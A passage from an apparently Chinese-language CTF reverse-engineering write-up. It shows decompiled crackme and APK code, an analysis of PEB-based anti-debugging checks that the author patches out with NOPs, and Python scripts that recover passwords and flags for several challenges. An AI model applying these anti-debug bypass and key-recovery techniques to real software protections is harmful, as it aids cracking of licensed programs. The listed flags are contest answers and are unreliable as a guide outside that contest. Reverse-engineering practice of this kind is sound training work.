class="keyword">int</span>)(v6 + <span class="number">1</span>) % <span class="number">2</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v14 + v3++) = v9;</span><br><span class="line">      v9 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt; <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 += box[++v11];</span><br><span class="line">    v12 = box[v11];</span><br><span class="line">    v7 = box[v10];</span><br><span class="line">    box[v10] = v12;</span><br><span class="line">    box[v11] = v7;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">104</span>) &amp; <span class="number">0x70</span> )</span><br><span class="line">      v12 = v10 + v11;</span><br><span class="line">    key[v5] = box[(<span class="keyword">unsigned</span> __int8)(v7 + v12)] ^ *(&amp;v14 + v4);</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">2</span>) &amp; <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-83</span>;</span><br><span class="line">      v11 = <span class="number">43</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">xor</span>(check_num, user, v5++);</span><br><span class="line">    v4 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &gt;= &amp;v14 + <span class="built_in">strlen</span>(&amp;v14) + <span class="number">1</span> - &amp;v15 )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  check2(key, &amp;check_num);</span><br><span class="line">  <span class="keyword">return</span> check_num == <span class="number">43924</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据调试,输入的password会每两个为一组(第一个while就是在将输入转为两个为一组的十六进制字符),来与box中的特定位置的数异或,得到一组8个key,后进入check2进行验证,最终得到<code>check_num == 43924</code>则成功。</p><p>check2:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_DWORD *__usercall check2@&lt;eax&gt;(<span class="keyword">int</span> a1@&lt;ebx&gt;, _BYTE *key, _DWORD *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST28_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// ST20_4</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ST1C_4</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">int</span> v15; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// ST14_4</span></span><br><span class="line">  <span class="keyword">int</span> v17; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">int</span> v19; <span class="comment">// ST10_4</span></span><br><span class="line">  <span class="keyword">int</span> v20; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v23; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v26; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *key == <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">4u</span>;</span><br><span class="line">    v4 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 ^= <span class="number">3u</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">1</span>] == <span class="number">98</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    _EAX = a3;</span><br><span class="line">    *a3 |= <span class="number">0x14</span>u;</span><br><span class="line">    v6 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x61</span>u;</span><br><span class="line">    _EAX = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; aam &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">2</span>] == <span class="number">97</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x84</span>u;</span><br><span class="line">    v9 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0xA</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v8 = *a3;</span><br><span class="line">  v10 = ~(a1 &gt;&gt; <span class="number">-91</span>);</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">3</span>] == <span class="number">112</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x114</span>u;</span><br><span class="line">    v12 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &gt;&gt;= <span class="number">7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v11 = *a3;</span><br><span class="line">  v13 = v10 - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">4</span>] == <span class="number">112</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x380</span>u;</span><br><span class="line">    v15 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 *= <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">24</span>) + <span class="number">12</span>) != <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[<span class="number">5</span>] == <span class="number">102</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a3 |= <span class="number">0x2DC</span>u;</span><br><span class="line">      v17 = *a3;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *a3 |= <span class="number">0x21</span>u;</span><br><span class="line">    &#125;</span><br><span class="line">    v16 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">5</span>] == <span class="number">115</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0xA04</span>u;</span><br><span class="line">    v18 = (<span class="keyword">char</span>)a3;</span><br><span class="line">    v20 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v18 = (<span class="keyword">char</span>)a3;</span><br><span class="line">    *a3 ^= <span class="number">0x1AD</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v19 = *a3;</span><br><span class="line">  _AL = v18 - v13;</span><br><span class="line">  __asm &#123; daa &#125;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">6</span>] == <span class="number">101</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x2310</span>u;</span><br><span class="line">    v24 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 |= <span class="number">0x4A</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  v23 = *a3;</span><br><span class="line">  <span class="keyword">if</span> ( key[<span class="number">7</span>] == <span class="number">99</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = a3;</span><br><span class="line">    *a3 |= <span class="number">0x8A10</span>u;</span><br><span class="line">    v26 = *a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a3 &amp;= <span class="number">0x3A3</span>u;</span><br><span class="line">    result = (_DWORD *)*a3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由分析可知,key应该为:<code>key = [100, 98, 97, 112, 112, 115, 101, 99]</code>,即<code>dbappsec</code>（本来key[5]可能值为115或102但前面由做过以dbappsec为密钥的题,便猜测为dbappsec）</p><p>接着,根据调试可知,xor函数是将key和user每位对应异或。</p><p>接着在调试中将box参与异或的位数提取出来,即可,但解出来本地输入就错误,故猜测下面这两处地方将异或操作进行了类似于反调试的操作,故将这两处直接nop掉</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">104</span>) &amp; <span class="number">0x70</span> )</span><br><span class="line">      v12 = v10 + v11;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( *(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">2</span>) &amp; <span class="number">0xFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="number">-83</span>;</span><br><span class="line">      v11 = <span class="number">43</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终得到解密脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">100</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key))</span><br><span class="line">xor = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line"></span><br><span class="line">user = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] ^= <span class="built_in">ord</span>(user[i])</span><br><span class="line">    key[i] ^= xor[i]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(key[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到:<code>39d09ffa4cfcc4cc</code></p><p>本地输入不会出现<code>Please try again</code>则猜测通过,但md532位小写hash加密后提交却不对,陷入自闭。</p><p>后用cmd打开crackMe.exe发现<code>39d09ffa4cfcc4cc</code>是错误的！</p><p>故用cmd直接打开,用IDA attach上去调试,xor数组不变但原程序中xor函数中不执行异或操作,实际毫无效果。</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/20190709205034.png" alt="xor"></p><p>因为调试直接跳过,就没有注意到下面会因为窗口的不同而不同,还是tcl…..</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StartupInfo.dwX</span><br><span class="line">    || StartupInfo.dwY</span><br><span class="line">    || StartupInfo.dwXCountChars</span><br><span class="line">    || StartupInfo.dwYCountChars</span><br><span class="line">    || StartupInfo.dwFillAttribute</span><br><span class="line">    || StartupInfo.dwXSize</span><br><span class="line">    || StartupInfo.dwYSize</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终解密脚本为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = [<span class="number">100</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,key))</span><br><span class="line">xor = [<span class="number">0x2A</span>, <span class="number">0xD7</span>, <span class="number">0x92</span>, <span class="number">0xE9</span>, <span class="number">0x53</span>, <span class="number">0xE2</span>, <span class="number">0xC4</span>, <span class="number">0xCD</span>]</span><br><span class="line"></span><br><span class="line">user = <span class="string">&quot;welcomebeijing&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] ^= xor[i]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(key[i])[<span class="number">2</span>:]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到第二个密码<code>4EB5F3992391A1AE</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user(6-16 letters or numbers):welcomebeijing</span><br><span class="line">password(6-16 letters or numbers):4EB5F3992391A1AE</span><br><span class="line">Congratulations:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之后进行md5加密后提交,得正确flag:</p><p>flag{d2be2981b84f2a905669995873d6a36c}</p><h3 id="findit"><a href="#findit" class="headerlink" title="findit"></a>findit</h3><p>下载下来是个apk文件,就直接jeb打开,根据字符串找到主要函数:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle arg8)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(arg8);</span><br><span class="line">        <span class="keyword">this</span>.setContentView(<span class="number">0x7F030018</span>);</span><br><span class="line">        <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003D</span>).setOnClickListener(<span class="keyword">new</span> View$OnClickListener(<span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;, <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003E</span>), <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;, <span class="keyword">this</span>.findViewById(<span class="number">0x7F05003F</span>)) &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg13)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">int</span> v11 = <span class="number">17</span>;</span><br><span class="line">                <span class="keyword">int</span> v10 = <span class="number">0x7A</span>;</span><br><span class="line">                <span class="keyword">int</span> v9 = <span class="number">90</span>;</span><br><span class="line">                <span class="keyword">int</span> v8 = <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">int</span> v7 = <span class="number">97</span>;</span><br><span class="line">                <span class="keyword">char</span>[] v3 = <span class="keyword">new</span> <span class="keyword">char</span>[v11];</span><br><span class="line">                <span class="keyword">char</span>[] v4 = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">int</span> v0;</span><br><span class="line">                <span class="keyword">for</span>(v0 = <span class="number">0</span>; v0 &lt; v11; ++v0) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &gt;= <span class="number">73</span> || <span class="keyword">this</span>.val$a[v0] &lt; v8) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &lt; <span class="number">105</span> &amp;&amp; <span class="keyword">this</span>.val$a[v0] &gt;= v7) &#123;</span><br><span class="line">                        label_39:</span><br><span class="line">                            v3[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$a[v0] + <span class="number">18</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$a[v0] &gt;= v8 &amp;&amp; <span class="keyword">this</span>.val$a[v0] &lt;= v9 || <span class="keyword">this</span>.val$a[v0] &gt;= v7 &amp;&amp; <span class="keyword">this</span>.val$a[v0] &lt;= v10) &#123;</span><br><span class="line">                            v3[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$a[v0] - <span class="number">8</span>));</span><br><span class="line">                            goto label_44;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        v3[v0] = <span class="keyword">this</span>.val$a[v0];</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        goto label_39;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                label_44:</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(String.valueOf(v3).equals(<span class="keyword">this</span>.val$edit.getText().toString())) &#123;</span><br><span class="line">                    v0 = <span class="number">0</span>;</span><br><span class="line">                    goto label_18;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.val$text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                label_18:</span><br><span class="line">                    <span class="keyword">while</span>(v0 &lt; <span class="number">38</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="keyword">this</span>.val$b[v0] &lt; v8 || <span class="keyword">this</span>.val$b[v0] &gt; v9) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">this</span>.val$b[v0] &gt;= v7 &amp;&amp; <span class="keyword">this</span>.val$b[v0] &lt;= v10) &#123;</span><br><span class="line">                            label_80:</span><br><span class="line">                                v4[v0] = ((<span class="keyword">char</span>)(<span class="keyword">this</span>.val$b[v0] + <span class="number">16</span>));</span><br><span class="line">                                <span class="keyword">if</span>((v4[v0] &lt;= v9 || v4[v0] &gt;= v7) &amp;&amp; v4[v0] &lt; v10) &#123;</span><br><span class="line">                                    goto label_95;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                v4[v0] = ((<span class="keyword">char</span>)(v4[v0] - <span class="number">26</span>));</span><br><span class="line">                                goto label_95;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            v4[v0] = <span class="keyword">this</span>.val$b[v0];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> &#123;</span><br><span class="line">                            goto label_80;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    label_95:</span><br><span class="line">                        ++v0;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">this</span>.val$text.setText(String.valueOf(v4));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察后发现解题方法有2:</p><p>1.逆推出输入</p><p>2.复现flag生成过程</p><p>我这里采用第2种,脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag = <span class="string">&quot;pvkq&#123;m164675262033l4m49lnp7p9mnk28k75&#125;&quot;</span></span><br><span class="line">flag = <span class="built_in">map</span>(<span class="built_in">ord</span>,flag)</span><br><span class="line"></span><br><span class="line">v11 = <span class="number">17</span></span><br><span class="line">v10 = <span class="number">0x7A</span></span><br><span class="line">v9 = <span class="number">90</span></span><br><span class="line">v8 = <span class="number">65</span></span><br><span class="line">v7 = <span class="number">97</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(flag)):</span><br><span class="line">    <span class="keyword">if</span> flag[i] &lt; v8 <span class="keyword">or</span> flag[i] &gt; v9:</span><br><span class="line">        <span class="keyword">if</span> flag[i] &gt;= v7 <span class="keyword">and</span> flag[i] &lt;= v10 :</span><br><span class="line">            flag[i] += <span class="number">16</span></span><br><span class="line">            <span class="keyword">if</span> (flag[i] &lt;= v9 <span class="keyword">or</span> flag[i] &gt;= v7) <span class="keyword">and</span> flag[i] &lt; v10:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            flag[i] = flag[i] - <span class="number">26</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i] += <span class="number">16</span></span><br><span class="line">        <span class="keyword">if</span> (flag[i] &lt;= v9 <span class="keyword">or</span> flag[i] &gt;= v7) <span class="keyword">and</span> flag[i] &lt; v10:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        flag[i] = flag[i] - <span class="number">26</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,flag))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得flag:<br>flag{c164675262033b4c49bdf7f9cda28a75}</p><h3 id="新年快乐"><a href="#新年快乐" class="headerlink" title="新年快乐"></a>新年快乐</h3><p>IDA打开, UPX壳, 官方工具直接脱</p><p>重新打开,直接能看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/xnkl-main.jpg" alt="xnkl-main"></p><p>得flag:</p><p>flag{HappyNewYear!}</p><h3 id="内涵的软件"><a href="#内涵的软件" class="headerlink" title="内涵的软件"></a>内涵的软件</h3><p>IDA打开直接看到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/reverse3-main.jpg" alt="reverse3-main"></p><p>得flag:</p><p>flag{49d3c93df25caad81232130f3d2ebfad}</p><h3 id="xor"><a href="#xor" class="headerlink" title="xor"></a>xor</h3><p>IDA打开,简单的异或题</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/xor-main.jpg" alt="xor-main"></p><p>python脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x66</span>, <span class="number">0x0A</span>, <span class="number">0x6B</span>, <span class="number">0x0C</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x4F</span>, <span class="number">0x2E</span>, <span class="number">0x40</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0x0D</span>, <span class="number">0x5A</span>, <span class="number">0x3B</span>, <span class="number">0x55</span>, <span class="number">0x11</span>, <span class="number">0x70</span>, <span class="number">0x19</span>, <span class="number">0x46</span>, <span class="number">0x1F</span>, <span class="number">0x76</span>, <span class="number">0x22</span>, <span class="number">0x4D</span>, <span class="number">0x23</span>, <span class="number">0x44</span>, <span class="number">0x0E</span>, <span class="number">0x67</span>, <span class="number">0x06</span>, <span class="number">0x68</span>, <span class="number">0x0F</span>, <span class="number">0x47</span>, <span class="number">0x32</span>, <span class="number">0x4F</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    s[i + <span class="number">1</span>] ^= s[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,s)))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>flag{QianQiuWanDai_YiTongJiangHu}</p><h3 id="reverse3"><a href="#reverse3" class="headerlink" title="reverse3"></a>reverse3</h3><p>IDA打开简单的加密</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/reverse3-main.jpg" alt="reverse3-main"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="built_in">bytearray</span>(<span class="string">b&quot;e3nifIH9b_C@n@dH&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    s[i] -= i</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(s))</span><br></pre></td></tr></table></figure><p>得到flag:</p><p>flag{i_l0ve_you}</p><h3 id="SimpleRev"><a href="#SimpleRev" class="headerlink" title="SimpleRev"></a>SimpleRev</h3><p>WSL子系统运行不了,<code>file</code> 一下是<code>ELF 64-bit LSB</code>程序</p><p>IDA打开,主要逻辑如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">Decry</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)src = <span class="string">&#x27;SLCDN&#x27;</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="string">&#x27;wodah&#x27;</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  text = join(key3, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v9); <span class="comment">// join函数的作用是拼接 最终text=&#x27;killshadow&#x27;</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1); <span class="comment">// 把key1 &#x27;ADSFK&#x27; 复制到key</span></span><br><span class="line">  <span class="built_in">strcat</span>(key, src); <span class="comment">// 把&#x27;SLCDN&#x27;反着接到后面 最后key=&#x27;ADSFKNDCLS&#x27;</span></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span 